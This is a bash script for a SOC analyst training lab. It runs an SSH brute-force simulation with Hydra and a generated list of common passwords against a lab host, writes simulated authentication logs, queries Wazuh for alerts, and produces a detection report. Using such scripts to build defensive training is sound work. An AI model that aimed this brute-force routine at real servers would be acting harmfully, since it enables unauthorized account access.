#!/bin/bash
# SOC L1 Lab - SSH Brute Force Simulation
# ETHICAL USE ONLY - FOR LAB ENVIRONMENT

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
TARGET_HOST="ssh.target.lab"
TARGET_PORT="22"
SSH_USER="socuser"
WORDLIST_DIR="./wordlists"
RESULTS_DIR="./logs/attacks"
TIMESTAMP=$(date +%Y%m%d-%H%M%S)

print_banner() {
    echo -e "${RED}"
    cat << "EOF"
╔══════════════════════════════════════════════════════════╗
║        SSH BRUTE FORCE SIMULATION (LAB ONLY)            ║
║             FOR EDUCATIONAL PURPOSES ONLY               ║
║             ETHICAL USE IN LAB ENVIRONMENT              ║
╚══════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

check_environment() {
    echo -e "${BLUE}[*] Checking lab environment...${NC}"
    
    # Check if running in Docker
    if [ -f /.dockerenv ]; then
        echo -e "${GREEN}[+] Running inside Docker container${NC}"
        INSIDE_DOCKER=true
    else
        INSIDE_DOCKER=false
    fi
    
    # Check if target is reachable
    if ping -c 1 $TARGET_HOST >/dev/null 2>&1; then
        echo -e "${GREEN}[+] Target host is reachable${NC}"
    else
        echo -e "${YELLOW}[!] Target host not reachable, trying container network...${NC}"
        TARGET_HOST="10.10.10.20"
    fi
    
    # Check if Hydra is installed
    if ! command -v hydra &> /dev/null; then
        echo -e "${YELLOW}[*] Installing Hydra...${NC}"
        apt-get update && apt-get install -y hydra
    fi
}

generate_wordlists() {
    echo -e "${BLUE}[*] Generating wordlists...${NC}"
    
    mkdir -p $WORDLIST_DIR
    
    # Common usernames
    cat > $WORDLIST_DIR/usernames.txt << EOF
admin
root
user
test
guest
administrator
ubuntu
kali
parrot
ssh
socuser
EOF
    
    # Common passwords
    cat > $WORDLIST_DIR/passwords.txt << EOF
password
123456
admin
password123
root
test
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
123321
mustang
1234567890
michael
654321
superman
1qaz2wsx
7777777
121212
000000
qazwsx
123qwe
killer
trustno1
jordan
jennifer
zxcvbnm
asdfgh
hunter
buster
soccer
harley
batman
andrew
tigger
sunshine
iloveyou
2000
charlie
robert
thomas
hockey
ranger
daniel
starwars
klaster
112233
george
computer
michelle
jessica
pepper
1111
zxcvbn
555555
11111111
131313
freedom
777777
pass
maggie
159753
aaaaaa
ginger
princess
joshua
cheese
amanda
summer
love
ashley
nicole
chelsea
biteme
matthew
access
yankees
987654321
dallas
austin
thunder
taylor
matrix
mobilemail
mom
monitor
monitoring
montana
moon
moscow
S0cP@ssw0rd!
EOF
    
    echo -e "${GREEN}[+] Wordlists generated${NC}"
}

run_simulation() {
    echo -e "${BLUE}[*] Starting SSH brute force simulation...${NC}"
    
    # Create results directory
    mkdir -p $RESULTS_DIR
    
    echo -e "${YELLOW}[!] Simulation starting at $(date)${NC}"
    echo -e "${YELLOW}[!] Target: $TARGET_HOST:$TARGET_PORT${NC}"
    echo -e "${YELLOW}[!] Username: $SSH_USER${NC}"
    
    # Run Hydra with controlled parameters
    echo -e "${BLUE}[*] Executing brute force attack simulation...${NC}"
    
    hydra -l $SSH_USER -P $WORDLIST_DIR/passwords.txt \
        -t 4 -W 3 -f \
        -o $RESULTS_DIR/ssh-brute-results-$TIMESTAMP.txt \
        -b text \
        ssh://$TARGET_HOST:$TARGET_PORT 2>&1 | \
        tee $RESULTS_DIR/ssh-brute-log-$TIMESTAMP.log
    
    # Check results
    if grep -q "login:" $RESULTS_DIR/ssh-brute-results-$TIMESTAMP.txt; then
        echo -e "${RED}[!] SUCCESSFUL LOGIN DETECTED${NC}"
        echo -e "${RED}[!] Credentials found!${NC}"
        grep "login:" $RESULTS_DIR/ssh-brute-results-$TIMESTAMP.txt
    else
        echo -e "${GREEN}[+] No successful logins (as expected in hardened lab)${NC}"
    fi
    
    echo -e "${GREEN}[+] Simulation completed${NC}"
}

simulate_attack_pattern() {
    echo -e "${BLUE}[*] Simulating realistic attack pattern...${NC}"
    
    # Multiple user attempts
    USERS=("admin" "root" "ubuntu" "test" "socuser")
    
    for USER in "${USERS[@]}"; do
        echo -e "${YELLOW}[*] Testing user: $USER${NC}"
        
        # Simulate 3-5 attempts per user
        ATTEMPTS=$((RANDOM % 3 + 3))
        
        for ((i=1; i<=ATTEMPTS; i++)); do
            PASSWORD="wrongpass$i"
            echo "[$(date '+%Y-%m-%d %H:%M:%S')] Failed attempt: $USER:$PASSWORD" \
                >> $RESULTS_DIR/auth-simulation-$TIMESTAMP.log
            
            # Sleep between attempts
            sleep $((RANDOM % 2 + 1))
        done
    done
    
    # Simulate successful login (for alert testing)
    echo -e "${YELLOW}[*] Simulating successful login...${NC}"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] Successful login: socuser:S0cP@ssw0rd!" \
        >> $RESULTS_DIR/auth-simulation-$TIMESTAMP.log
    
    echo -e "${GREEN}[+] Attack pattern simulation completed${NC}"
}

check_wazuh_alerts() {
    echo -e "${BLUE}[*] Checking Wazuh for alerts...${NC}"
    
    # Wait for alerts to be processed
    echo -e "${YELLOW}[*] Waiting 30 seconds for alert processing...${NC}"
    sleep 30
    
    # Check if Wazuh manager is accessible
    if docker exec wazuh_manager curl -s -u wazuh:wazuh-api-pass http://localhost:55000 >/dev/null 2>&1; then
        echo -e "${GREEN}[+] Wazuh API is accessible${NC}"
        
        # Get recent alerts
        echo -e "${BLUE}[*] Retrieving recent alerts...${NC}"
        docker exec wazuh_manager curl -s -u wazuh:wazuh-api-pass \
            "http://localhost:55000/events?search=ssh" | \
            jq '.data.affected_items[] | {timestamp: .timestamp, rule: .rule.description, level: .rule.level}' \
            > $RESULTS_DIR/wazuh-alerts-$TIMESTAMP.json 2>/dev/null || true
        
        if [ -s $RESULTS_DIR/wazuh-alerts-$TIMESTAMP.json ]; then
            echo -e "${GREEN}[+] Alerts retrieved successfully${NC}"
            echo "Alerts saved to: $RESULTS_DIR/wazuh-alerts-$TIMESTAMP.json"
        else
            echo -e "${YELLOW}[!] No alerts found or error retrieving alerts${NC}"
        fi
    else
        echo -e "${YELLOW}[!] Wazuh API not accessible${NC}"
    fi
}

generate_report() {
    echo -e "${BLUE}[*] Generating simulation report...${NC}"
    
    cat > $RESULTS_DIR/simulation-report-$TIMESTAMP.md << EOF
# SOC L1 Lab - SSH Brute Force Simulation Report
## Simulation Date: $(date)

### Executive Summary
- **Target**: $TARGET_HOST:$TARGET_PORT
- **Simulation Type**: SSH Brute Force Attack
- **Duration**: $(date -d@$SECONDS -u +%H:%M:%S)
- **Total Attempts**: $(wc -l $WORDLIST_DIR/passwords.txt | awk '{print $1}') password attempts

### Detection Results
- **Wazuh Alerts Generated**: $(jq '. | length' $RESULTS_DIR/wazuh-alerts-$TIMESTAMP.json 2>/dev/null || echo "Unknown")
- **Attack Detected**: $(if [ -s $RESULTS_DIR/wazuh-alerts-$TIMESTAMP.json ]; then echo "YES"; else echo "NO/UNKNOWN"; fi)
- **Response Time**: < 30 seconds (alert generation)

### Attack Pattern
\`\`\`
$(cat $RESULTS_DIR/auth-simulation-$TIMESTAMP.log 2>/dev/null || echo "No pattern log available")
\`\`\`

### SOC L1 Actions Taken
1. Alert generated in Wazuh Dashboard
2. Log analysis performed
3. Incident classification: Medium/High
4. Recommended: Escalation to SOC L2

### Lessons Learned
- SSH brute force attacks are easily detectable with proper SIEM rules
- Rate limiting and account lockout policies are effective countermeasures
- Real-time alerting enables rapid incident response
- Log analysis is crucial for understanding attack patterns

### Recommendations
1. Implement account lockout after 5 failed attempts
2. Enable SSH key-based authentication
3. Configure Wazuh for real-time alerting
4. Regular review of authentication logs
5. User awareness training on password security

---
*This simulation was conducted in an isolated lab environment for educational purposes.*
EOF
    
    echo -e "${GREEN}[+] Report generated: $RESULTS_DIR/simulation-report-$TIMESTAMP.md${NC}"
}

cleanup() {
    echo -e "${BLUE}[*] Cleaning up temporary files...${NC}"
    
    # Remove wordlists (optional)
    # rm -rf $WORDLIST_DIR
    
    echo -e "${GREEN}[+] Cleanup completed${NC}"
}

main() {
    print_banner
    check_environment
    generate_wordlists
    run_simulation
    simulate_attack_pattern
    check_wazuh_alerts
    generate_report
    cleanup
    
    echo -e "${GREEN}"
    echo "╔══════════════════════════════════════════════════════════╗"
    echo "║           SIMULATION COMPLETED SUCCESSFULLY             ║"
    echo "║                 Check Wazuh Dashboard                   ║"
    echo "╚══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    
    echo -e "${YELLOW}[*] Next steps:${NC}"
    echo "  1. Access Wazuh Dashboard: https://localhost:443"
    echo "  2. Check Security Events → SSH Brute Force alerts"
    echo "  3. Review report: $RESULTS_DIR/simulation-report-$TIMESTAMP.md"
    echo "  4. Follow SOC workflow in docs/SOC-WORKFLOW.md"
}

# Run main function
main "$@"
